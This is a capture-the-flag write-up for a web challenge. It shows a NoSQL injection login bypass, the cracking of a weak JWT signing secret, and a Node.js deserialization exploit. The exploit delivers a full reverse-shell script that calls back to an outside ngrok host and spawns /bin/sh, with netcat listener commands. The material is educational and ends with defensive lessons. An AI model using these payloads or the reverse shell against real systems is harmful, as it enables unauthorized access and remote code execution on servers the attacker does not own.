# Breakfast with Grandma - CTF WriteUp

**Challenge by:** @j3x  
**Event:** PWN TILL S'HOUR  
**Organized by:** @Shellmates

> This is my first CTF writeup! I'll walk through not just the solution, but also my thought process along the way.

---

## Challenge Overview

We're presented with a login page that uses JSON for credential handling. The challenge description hints at checking cookies after logging in.

![Login Page](login.png)
![JSON Credits](JSON-Credits.png)

---

## Phase 1: NoSQL Injection

### Initial Discovery

While testing with Burp Suite, I noticed the application returns credentials in JSON format. This immediately suggested a NoSQL database (MongoDB with Node.js). To confirm this, I triggered an error:

![Node Error](Node-error.png)

### What is NoSQL Injection?

NoSQL injection is a vulnerability in web applications using NoSQL databases. Attackers can exploit this to bypass authentication, extract data, modify database contents, or compromise the server. These vulnerabilities typically occur when user input isn't properly sanitized.

### Exploitation

I started with a basic admin credential injection:
```json
{"username":"admin","password":{"$ne": "x"}}
```

This worked, but I refined it to bypass authentication completely:
```json
{"username":{"$ne": "x"},"password":{"$ne": "x"}}
```

![NoSQL Injection Payload](Payload-NoSQLi.png)
![Successful Login](SuccessLogin-Dashboard.png)

**Resources:** Check out [HackTricks NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection) for more details.

---

## Phase 2: JWT Token Analysis

After logging in, I inspected the cookies (Developer Tools → Storage Tab or `Ctrl+Shift+C`). Found a JWT token which I decoded using [JWT.io](https://jwt.io):

```json
{
  "userId": "********************",
  "encodedData": "eyJ1c2VybmFtZSI6ImJvYmJ5IiwiYWdlIjo0LCJmYXZvdXJpdGVNZWFsIjoiQ2VyZWFscyIsIl8ybmRGYXZNZWFsIjoiQ29va2llcyJ9",
  "iat": 1712537034
}
```

The `encodedData` field contains Base64-encoded user data. Decoding it reveals:
```json
{"username":"bobby","age":4,"favouriteMeal":"Cereals","_2ndFavMeal":"Cookies"}
```

This matches the dashboard data.

---

## Phase 3: JWT Signature Cracking

To modify the JWT, I needed to crack the signature using John the Ripper:

```bash
john token.txt -w=/usr/share/wordlists/rockyou.txt
```

**Result:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shellmatexx      (?)     
1g 0:00:00:01 DONE (2024-04-08 01:52) 0.8928g/s 3408Kp/s 3408Kc/s 3408KC/s
```

**Secret key found:** `shellmatexx`

Now I can forge JWT tokens!

---

## Phase 4: Node.js Deserialization RCE

After examining the source code, I found serialization/deserialization logic. Research confirmed this is vulnerable to Remote Code Execution (RCE).

### First Attempt (Failed)

I tried a basic exploit from [Exploit-DB #45265](https://www.exploit-db.com/exploits/45265):

```json
{"username":"bobby","age":4,"favouriteMeal":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()","_2ndFavMeal":"Cookies"}
```

After Base64 encoding and signing with the cracked JWT secret, this payload didn't work.

![First RCE Attempt Failed](First-RCE-Not-Working.png)

### Second Attempt (Success!)

I found a more advanced technique using `eval` from [this article](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

**Reverse Shell Code:**
```javascript
var net = require('net');
var spawn = require('child_process').spawn;
HOST="3.125.188.168"; // Your ngrok public IP
PORT="14447";         // Your ngrok public PORT
TIMEOUT="5000";

if (typeof String.prototype.contains === 'undefined') { 
    String.prototype.contains = function(it) { 
        return this.indexOf(it) != -1; 
    }; 
}

function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
```

**Exploitation Steps:**

1. Convert the reverse shell code to decimal ASCII (comma-separated)
2. Wrap it in `eval(String.fromCharCode(...))`
3. Place in the deserialization payload: `_$$ND_FUNC$$_function (){ eval(...) }()`
4. Encode the entire JSON as Base64
5. Sign with JWT secret `shellmatexx`
6. Replace the JWT cookie and refresh

**Setting Up the Listener:**

```bash
# Terminal 1: Setup ngrok
sudo ngrok tcp 4444

# Terminal 2: Start netcat listener
nc -lvp 4444
```

For more details on using ngrok with netcat, check [this guide](https://drxh3kr.medium.com/using-netcat-with-ngrok-ip-for-receiving-reverse-shell-25ba7a498aab).

---

## Getting the Flag

After establishing the reverse shell, I explored the filesystem and found the flag in the root directory (`/`).

![Reverse Shell and Flag](Ngrok-RV-Flag.png)

---

## Conclusion

This was an amazing challenge that combined multiple techniques:
- NoSQL injection for authentication bypass
- JWT token manipulation
- Node.js deserialization RCE

Big thanks to @j3x for creating this creative and educational challenge!

---

## Key Takeaways

- Always sanitize user input, especially in NoSQL queries
- Use strong secrets for JWT signing
- Never deserialize untrusted data without proper validation
- Defense in depth: multiple security layers prevent exploitation chains like this
